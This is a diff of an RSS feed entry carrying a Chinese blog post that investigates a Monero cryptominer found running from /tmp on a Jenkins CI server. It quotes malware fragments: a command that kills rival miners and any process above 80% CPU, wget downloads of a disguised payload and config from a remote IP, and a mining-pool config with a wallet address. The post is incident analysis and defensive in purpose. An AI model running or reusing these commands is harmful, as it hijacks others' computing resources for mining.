@@ -25,17 +25,19 @@
 由于我们采用NewRelic对所有的持续集成服务器进行监控。所以可以得到CPU、内存、磁盘和网络的性能监控数据以及横向的对比信息。通过对比相关的数据，我们发现这一台服务器上有个在/tmp目录下运行的叫`donns`的陌生进程长期占用大量CPU，它的文件权限属于Jenkins用户以及Jenkins用户组。所以这个程序的执行是由Jenkins出发了。
 我们在Jenkins的相关网站里搜索这个名为donns进程的相关信息，但一无所获。于是我们在/tmp目录中寻找和这个进程相关的信息，我们发现了一个陌生的Shell脚本，打开内容看，内容却让我们大跌眼镜。想看脚本完整源代码的请点击这里，一下是几个重要的脚本片段：
 代码片段 1:
-pkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk &#39;{if(\$3\&amp;gt;80.0) print &amp;quot;kill -9 &amp;quot; \$2}&#39;|sh pkill bonns  我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。
+pkill conns ps auxw|head -1;ps auxw|sort -rn -k3|head -1|awk &amp;#39;{if(\$3\&amp;gt;80.0) print &amp;#34;kill -9 &amp;#34; \$2}&amp;#39;|sh pkill bonns 我们看到，这段代码杀死了占用CPU超过80%的进程。此外，杀死了名为conns和bonns的进程。
 conns进程是什么？bonns进程又是什么？为什么要杀死CPU占用率超过80%的进程？
 代码片段 2:
-wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf  从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？
+wget 91.235.143.129:8086/587b626883fdc.png -O /tmp/conn wget 91.235.143.129:8086/1eac80002f.conf -O /tmp/config.conf 从91.235.143.129:8086下载了一个图片和一个配置文件。这个服务器是干嘛的？这个配置文件又包含了哪些内容？
 通过在自己的沙盒环境里打开这个配置文件，发现它的内容是这样的：
-{ &amp;quot;url&amp;quot; : &amp;quot;stratum+tcp://xmr.crypto-pool.fr:3333&amp;quot;, &amp;quot;user&amp;quot; : &amp;quot;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k&amp;quot;, &amp;quot;pass&amp;quot; : &amp;quot;x&amp;quot; }  stratum+tcp 协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：
- 门罗币XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。
+{ &amp;#34;url&amp;#34; : &amp;#34;stratum+tcp://xmr.crypto-pool.fr:3333&amp;#34;, &amp;#34;user&amp;#34; : &amp;#34;43ZQzwdYHC9ebXxZhJuwkH5jvmfEBCEjkd1PvqxacrJaEDQFyNuxJhcib8MsJRgFnbATB6rpBEzq8EKqRqUbjyNy3opCS4k&amp;#34;, &amp;#34;pass&amp;#34; : &amp;#34;x&amp;#34; } stratum+tcp 协议引发了我的好奇心，经过调查，这居然是一个叫做门罗币的加密虚拟币的矿池协议：
+ 门罗币****XMR一种使用CryptoNote协议的一个虚拟币币种，其并不是比特币的一个分支。CryptoNote在2012年已经开发出来，当年已有Bytecoin使用CrytoNote技术，XMR是在2014年开发出来，可以预见CryptoNote技术已经非常成熟，该技术通过数字环签名提供更好的匿名性。目前国内对该币种匿名技术宣传较少，国外知名度较高。Monero词语是引自于世界语，在世界语中的含义表示为货币。
 而矿池则是是比特币(Bitcoin)等P2P密码学虚拟货币开采所必须的基础设施，一般是对外开放的团队开采服务器，其存在意义为提升比特币开采稳定性，使矿工薪酬趋于稳定。
 假设100万人参与比特币挖矿，全网400P算力，其中90%的矿工为1P(1000T)以下的算力，如果投入一台1T矿机，将占全网算力的40万分之1，理论上平均每40万个10分钟能挖到一个区块，也就是7.6年才能挖到一个区块然后一次性拿到50个比特币。那么，假如我再找9个拥有1T算力矿机的矿工，达成协定，我们总共10个人，其中任何一个人挖到区块，都按照每人的算力占比来进行平分，那么我们就是一个整体，总共10T算力，那么平均0.76年即可挖到一个区块，然后算下来到我们手上的就是0.76年开采到5个比特币，如果组织100人、1000人、1万人甚至10万人呢？如果是10万人，那么平均100分钟就能挖到1个区块，作为团队的一份子，我的收入将会趋于稳定。这就是矿池的基本原理，即大家组队进行比特币开采，可以参考彩票中的合买。
  当然，以上只是对矿池的基本原理和性质进行简单的描述，实际情况会非常复杂。矿池是一个全自动的开采平台，即矿机接入矿池——提供算力——获得收益。
-抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https://monero.crypto-pool.fr/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。</description>
+抱着“大胆假设，小心求证”的心态，我们找到了配置文件中这家叫做crypyto-pool的网站https://monero.crypto-pool.fr/它是一个著名门罗币的矿池网站。而通过配置文件的用户名，我们看到了这个程序的挖矿记录和转账记录。根据6月份的交易数据以及对应牌价，截止作者发稿时，该程序已 为作者赚取了 1165.64 美元的收益。
+而接下来的代码间接暴露了证据：
+代码片段 3:</description>
     </item>
     
     <item>
